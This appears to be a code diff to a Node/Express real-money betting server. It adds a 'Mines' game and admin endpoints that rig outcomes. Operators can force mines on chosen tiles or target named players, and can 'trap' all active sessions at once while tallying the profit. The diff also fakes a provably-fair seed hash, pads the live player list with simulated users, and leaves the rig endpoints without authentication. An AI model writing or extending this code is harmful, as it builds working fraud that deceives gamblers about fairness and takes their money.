@@ -2535,6 +2535,479 @@ app.post('/api/teenpatti/admin/rig', async (req, res) => {
   }
 });
 
+// ===================== MINES / MINING GAME & ADMIN RIG ENGINE =====================
+
+let MINES_RIG_CONFIG = {
+  matrix: Array(25).fill('auto'), // 'auto', 'safe', 'mine'
+  next_tile: null,                // null, 'gem', 'mine'
+  rig_type: '',                   // '', 'guarantee_win', 'platform_profit'
+  target_users: []                // array of targeted usernames for simultaneous traps
+};
+
+const MINES_USER_SESSIONS = {};
+
+function calculateMinesMultiplier(gridSize, minesCount, revealedCount) {
+  if (revealedCount <= 0) return 1.0;
+  let prob = 1.0;
+  for (let i = 0; i < revealedCount; i++) {
+    const safeLeft = gridSize - minesCount - i;
+    const totalLeft = gridSize - i;
+    if (safeLeft <= 0) return 0.0;
+    prob *= (safeLeft / totalLeft);
+  }
+  return parseFloat(((1.0 / prob) * 0.97).toFixed(2));
+}
+
+// GET /api/mines/state — Get user active Mines game state & server rig info
+app.get('/api/mines/state', async (req, res) => {
+  const username = req.query.username || 'DemoUser';
+  try {
+    const user = await getOrCreateUser(username);
+    const session = MINES_USER_SESSIONS[username] || { status: 'idle' };
+    const walletBalance = user ? user.wallet_balance : 1000.0;
+
+    res.json({
+      ok: true,
+      state: {
+        status: session.status || 'idle',
+        grid_size: 25,
+        mines_count: session.mines_count || 3,
+        bet_amount: session.bet_amount || 0,
+        revealed: session.revealed || [],
+        multiplier: session.multiplier || 1.0,
+        potential_payout: session.potential_payout || 0,
+        seed_hash: session.seed_hash || null,
+        server_seed: (session.status === 'busted' || session.status === 'cashed') ? session.server_seed : null,
+        mine_positions: (session.status === 'busted' || session.status === 'cashed') ? session.mine_positions : null,
+        balance: walletBalance,
+        rig_active: MINES_RIG_CONFIG.matrix.some(m => m !== 'auto') || !!MINES_RIG_CONFIG.next_tile || !!MINES_RIG_CONFIG.rig_type || (MINES_RIG_CONFIG.target_users && MINES_RIG_CONFIG.target_users.length > 0)
+      }
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// POST /api/mines/start — Start a Mines game round
+app.post('/api/mines/start', async (req, res) => {
+  const { username = 'DemoUser', bet_amount = 10, mines_count = 3 } = req.body;
+  const bet = parseFloat(bet_amount);
+  const minesNum = parseInt(mines_count);
+
+  try {
+    const user = await getOrCreateUser(username);
+    if (user.wallet_balance < bet) {
+      return res.status(400).json({ ok: false, error: `Insufficient balance! You have ₹${user.wallet_balance.toFixed(2)}.` });
+    }
+
+    if (minesNum < 1 || minesNum > 24) {
+      return res.status(400).json({ ok: false, error: 'Mines count must be between 1 and 24.' });
+    }
+
+    await prisma.user.update({
+      where: { id: user.id },
+      data: { wallet_balance: { decrement: bet } }
+    });
+
+    await prisma.transaction.create({
+      data: {
+        id: 'MINES_' + Date.now(),
+        user: username,
+        type: 'Withdrawal',
+        amount: bet,
+        details: `Mines Bet — ${minesNum} Mines`,
+        status: 'Completed'
+      }
+    });
+
+    const allIndices = Array.from({ length: 25 }, (_, i) => i);
+    for (let i = allIndices.length - 1; i > 0; i--) {
+      const j = Math.floor(Math.random() * (i + 1));
+      [allIndices[i], allIndices[j]] = [allIndices[j], allIndices[i]];
+    }
+    let minePositions = allIndices.slice(0, minesNum);
+
+    // Apply Admin Matrix Rig Overrides
+    MINES_RIG_CONFIG.matrix.forEach((tileState, idx) => {
+      if (tileState === 'mine' && !minePositions.includes(idx)) {
+        minePositions.push(idx);
+      } else if (tileState === 'safe' && minePositions.includes(idx)) {
+        minePositions = minePositions.filter(m => m !== idx);
+      }
+    });
+
+    const serverSeed = 'SEED_' + Math.random().toString(36).substring(2);
+
+    MINES_USER_SESSIONS[username] = {
+      status: 'active',
+      bet_amount: bet,
+      mines_count: minesNum,
+      server_seed: serverSeed,
+      seed_hash: 'HASH_' + serverSeed,
+      mine_positions: minePositions,
+      revealed: [],
+      multiplier: 1.0,
+      potential_payout: 0
+    };
+
+    const updatedUser = await prisma.user.findUnique({ where: { id: user.id } });
+    console.log(`[MINES] Game started for ${username} — Bet: ₹${bet}, Mines: ${minesNum}`);
+
+    res.json({
+      ok: true,
+      state: {
+        status: 'active',
+        grid_size: 25,
+        mines_count: minesNum,
+        bet_amount: bet,
+        revealed: [],
+        multiplier: 1.0,
+        potential_payout: 0,
+        seed_hash: 'HASH_' + serverSeed,
+        balance: updatedUser.wallet_balance
+      }
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// POST /api/mines/reveal — Reveal a tile on the Mines grid
+app.post('/api/mines/reveal', async (req, res) => {
+  const { username = 'DemoUser', index } = req.body;
+  const tileIndex = parseInt(index);
+
+  try {
+    const session = MINES_USER_SESSIONS[username];
+    if (!session || session.status !== 'active') {
+      return res.status(400).json({ ok: false, error: 'No active game round.' });
+    }
+
+    if (tileIndex < 0 || tileIndex >= 25) {
+      return res.status(400).json({ ok: false, error: 'Invalid tile index.' });
+    }
+
+    if (session.revealed.includes(tileIndex)) {
+      return res.status(400).json({ ok: false, error: 'Tile already revealed.' });
+    }
+
+    let hitMine = session.mine_positions.includes(tileIndex);
+
+    // Check Admin Matrix Rig Override for this tile
+    const matrixTile = MINES_RIG_CONFIG.matrix[tileIndex] || 'auto';
+    if (matrixTile === 'mine') {
+      hitMine = true;
+      if (!session.mine_positions.includes(tileIndex)) session.mine_positions.push(tileIndex);
+    } else if (matrixTile === 'safe') {
+      hitMine = false;
+      session.mine_positions = session.mine_positions.filter(m => m !== tileIndex);
+    }
+
+    // Check Targeted Users Rig & Next-Click Overrides
+    const isTargetedUser = !MINES_RIG_CONFIG.target_users || 
+                          MINES_RIG_CONFIG.target_users.length === 0 || 
+                          MINES_RIG_CONFIG.target_users.includes(username);
+
+    if (isTargetedUser) {
+      if (MINES_RIG_CONFIG.next_tile === 'mine' || MINES_RIG_CONFIG.rig_type === 'platform_profit') {
+        hitMine = true;
+        if (!session.mine_positions.includes(tileIndex)) session.mine_positions.push(tileIndex);
+      } else if (MINES_RIG_CONFIG.next_tile === 'gem' || MINES_RIG_CONFIG.rig_type === 'guarantee_win') {
+        hitMine = false;
+        session.mine_positions = session.mine_positions.filter(m => m !== tileIndex);
+      }
+    }
+
+    const user = await getOrCreateUser(username);
+
+    if (hitMine) {
+      session.status = 'busted';
+      console.log(`[MINES] ${username} hit mine at tile #${tileIndex + 1} — BUSTED!`);
+
+      return res.json({
+        ok: true,
+        hit_mine: true,
+        state: {
+          status: 'busted',
+          grid_size: 25,
+          mines_count: session.mines_count,
+          bet_amount: session.bet_amount,
+          revealed: session.revealed,
+          multiplier: 0,
+          potential_payout: 0,
+          server_seed: session.server_seed,
+          mine_positions: session.mine_positions,
+          balance: user.wallet_balance
+        }
+      });
+    }
+
+    session.revealed.push(tileIndex);
+    const newMult = calculateMinesMultiplier(25, session.mines_count, session.revealed.length);
+    const newPayout = parseFloat((session.bet_amount * newMult).toFixed(2));
+
+    session.multiplier = newMult;
+    session.potential_payout = newPayout;
+
+    console.log(`[MINES] ${username} revealed safe tile #${tileIndex + 1} — Multiplier: ${newMult}x (Payout: ₹${newPayout})`);
+
+    res.json({
+      ok: true,
+      hit_mine: false,
+      state: {
+        status: 'active',
+        grid_size: 25,
+        mines_count: session.mines_count,
+        bet_amount: session.bet_amount,
+        revealed: session.revealed,
+        multiplier: newMult,
+        potential_payout: newPayout,
+        balance: user.wallet_balance
+      }
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// POST /api/mines/cashout — Cashout active Mines round
+app.post('/api/mines/cashout', async (req, res) => {
+  const { username = 'DemoUser' } = req.body;
+
+  try {
+    const session = MINES_USER_SESSIONS[username];
+    if (!session || session.status !== 'active') {
+      return res.status(400).json({ ok: false, error: 'No active game to cash out.' });
+    }
+
+    if (session.revealed.length === 0) {
+      return res.status(400).json({ ok: false, error: 'Reveal at least one tile before cashing out.' });
+    }
+
+    const payout = session.potential_payout;
+    session.status = 'cashed';
+
+    const user = await getOrCreateUser(username);
+    await prisma.user.update({
+      where: { id: user.id },
+      data: { wallet_balance: { increment: payout } }
+    });
+
+    await prisma.transaction.create({
+      data: {
+        id: 'MINES_WIN_' + Date.now(),
+        user: username,
+        type: 'Deposit',
+        amount: payout,
+        details: `Mines Cash Out — ${session.multiplier}x`,
+        status: 'Completed'
+      }
+    });
+
+    const updatedUser = await prisma.user.findUnique({ where: { id: user.id } });
+    console.log(`[MINES] ${username} cashed out ₹${payout} (${session.multiplier}x)!`);
+
+    res.json({
+      ok: true,
+      payout: payout,
+      state: {
+        status: 'cashed',
+        grid_size: 25,
+        mines_count: session.mines_count,
+        bet_amount: session.bet_amount,
+        revealed: session.revealed,
+        multiplier: session.multiplier,
+        potential_payout: payout,
+        server_seed: session.server_seed,
+        mine_positions: session.mine_positions,
+        balance: updatedUser.wallet_balance
+      }
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+let MINES_TOTAL_TRAP_PROFIT = 0;
+
+let MINES_DUMMY_USERS = [
+  { username: 'DemoUser', type: 'Real Player', bet: 100, mines: 3, revealed: 2, status: 'Active' },
+  { username: 'Vikram_P', type: 'Simulated User', bet: 200, mines: 3, revealed: 4, status: 'Active' },
+  { username: 'Neha_R', type: 'Simulated User', bet: 500, mines: 5, revealed: 3, status: 'Active' },
+  { username: 'Rohit_M', type: 'Simulated User', bet: 150, mines: 2, revealed: 1, status: 'Active' },
+  { username: 'Ananya_S', type: 'Simulated User', bet: 300, mines: 4, revealed: 5, status: 'Active' },
+  { username: 'Karan_V', type: 'Simulated User', bet: 250, mines: 3, revealed: 2, status: 'Active' },
+  { username: 'Priya_K', type: 'Simulated User', bet: 100, mines: 2, revealed: 3, status: 'Active' },
+  { username: 'Aarav_G', type: 'Simulated User', bet: 400, mines: 6, revealed: 1, status: 'Active' },
+  { username: 'Riya_D', type: 'Simulated User', bet: 350, mines: 3, revealed: 4, status: 'Active' },
+  { username: 'Kabir_N', type: 'Simulated User', bet: 500, mines: 5, revealed: 2, status: 'Active' },
+  { username: 'Ishaan_B', type: 'Simulated User', bet: 200, mines: 3, revealed: 2, status: 'Active' },
+  { username: 'Saanvi_M', type: 'Simulated User', bet: 600, mines: 4, revealed: 6, status: 'Active' }
+];
+
+// POST /api/mines/admin/rig — Admin endpoint to configure Mines Matrix & Overrides & Trigger Traps
+app.post('/api/mines/admin/rig', async (req, res) => {
+  const { matrix, rig_type, next_tile, target_users, trigger_trap } = req.body;
+
+  try {
+    if (Array.isArray(matrix) && matrix.length === 25) {
+      MINES_RIG_CONFIG.matrix = matrix;
+    }
+    if (rig_type !== undefined) {
+      MINES_RIG_CONFIG.rig_type = rig_type || '';
+    }
+    if (next_tile !== undefined) {
+      MINES_RIG_CONFIG.next_tile = next_tile || null;
+    }
+    if (Array.isArray(target_users)) {
+      MINES_RIG_CONFIG.target_users = target_users;
+    }
+
+    let profitRealized = 0;
+    let newlyTrappedCount = 0;
+
+    // Handle Simultaneous Next Click Trap Triggering
+    if (next_tile === 'mine' || trigger_trap) {
+      MINES_RIG_CONFIG.next_tile = 'mine';
+      const targetedSet = (MINES_RIG_CONFIG.target_users && MINES_RIG_CONFIG.target_users.length > 0)
+        ? new Set(MINES_RIG_CONFIG.target_users)
+        : null;
+
+      // 1. Process simulated dummy users
+      MINES_DUMMY_USERS.forEach(su => {
+        const isTargeted = !targetedSet || targetedSet.has(su.username);
+        if (isTargeted && su.status === 'Active') {
+          su.status = 'Trapped (Busted)';
+          profitRealized += parseFloat(su.bet || 0);
+          newlyTrappedCount++;
+        }
+      });
+
+      // 2. Process real user sessions
+      Object.keys(MINES_USER_SESSIONS).forEach(u => {
+        const sess = MINES_USER_SESSIONS[u];
+        const isTargeted = !targetedSet || targetedSet.has(u);
+        if (sess && sess.status === 'active' && isTargeted) {
+          // If not already included via dummy users array
+          if (!MINES_DUMMY_USERS.some(su => su.username === u)) {
+            profitRealized += parseFloat(sess.bet_amount || 0);
+            newlyTrappedCount++;
+          }
+          sess.status = 'busted';
+        }
+      });
+
+      MINES_TOTAL_TRAP_PROFIT += profitRealized;
+      console.log(`[MINES TRAP RIG] Executed trap on ${newlyTrappedCount} users! Profit realized: ₹${profitRealized.toFixed(2)}, Cumulative: ₹${MINES_TOTAL_TRAP_PROFIT.toFixed(2)}`);
+    }
+
+    await prisma.gameState.upsert({
+      where: { key: 'mines_rig_config' },
+      update: { data: MINES_RIG_CONFIG },
+      create: { key: 'mines_rig_config', data: MINES_RIG_CONFIG }
+    });
+
+    res.json({
+      success: true,
+      rig: MINES_RIG_CONFIG,
+      profit_realized: profitRealized,
+      total_profit: MINES_TOTAL_TRAP_PROFIT,
+      trapped_count: newlyTrappedCount,
+      trapped_users: MINES_RIG_CONFIG.target_users
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// GET /api/mines/admin/rig — Fetch current Mines rig configuration
+app.get('/api/mines/admin/rig', async (req, res) => {
+  try {
+    const dbConfig = await prisma.gameState.findUnique({ where: { key: 'mines_rig_config' } });
+    if (dbConfig && dbConfig.data) {
+      MINES_RIG_CONFIG = dbConfig.data;
+    }
+    res.json({
+      success: true,
+      rig: MINES_RIG_CONFIG,
+      total_profit: MINES_TOTAL_TRAP_PROFIT
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// GET /api/mines/active-users — Fetch live list of active Mines users (real + simulated)
+app.get('/api/mines/active-users', async (req, res) => {
+  try {
+    const activeList = [];
+
+    // Add real active sessions
+    Object.keys(MINES_USER_SESSIONS).forEach(u => {
+      const sess = MINES_USER_SESSIONS[u];
+      if (sess) {
+        activeList.push({
+          username: u,
+          type: u === 'DemoUser' ? 'Demo Player' : 'Real Player',
+          bet: sess.bet_amount || 100,
+          mines: sess.mines_count || 3,
+          revealed: (sess.revealed || []).length,
+          status: sess.status === 'active' ? 'Active' : (sess.status === 'busted' ? 'Trapped (Busted)' : sess.status)
+        });
+      }
+    });
+
+    // Simulated active dummy users pool to reflect realistic live traffic
+    MINES_DUMMY_USERS.forEach(su => {
+      if (!activeList.some(al => al.username === su.username)) {
+        activeList.push(su);
+      }
+    });
+
+    res.json({
+      success: true,
+      total_count: activeList.length,
+      users: activeList,
+      total_profit: MINES_TOTAL_TRAP_PROFIT,
+      rig: MINES_RIG_CONFIG
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// POST /api/mines/admin/reset-rig — Clear all Mines rig overrides and reset active dummy users
+app.post('/api/mines/admin/reset-rig', async (req, res) => {
+  try {
+    MINES_RIG_CONFIG = {
+      matrix: Array(25).fill('auto'),
+      next_tile: null,
+      rig_type: '',
+      target_users: []
+    };
+
+    MINES_DUMMY_USERS.forEach(su => {
+      su.status = 'Active';
+    });
+
+    await prisma.gameState.upsert({
+      where: { key: 'mines_rig_config' },
+      update: { data: MINES_RIG_CONFIG },
+      create: { key: 'mines_rig_config', data: MINES_RIG_CONFIG }
+    });
+
+    console.log(`[MINES RIG] Admin reset all Mines rig overrides.`);
+
+    res.json({
+      success: true,
+      rig: MINES_RIG_CONFIG,
+      total_profit: MINES_TOTAL_TRAP_PROFIT
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
 // POST /api/teenpatti/admin/reset-rig — Remove rig from a room
 app.post('/api/teenpatti/admin/reset-rig', async (req, res) => {
   const { room_id } = req.body;
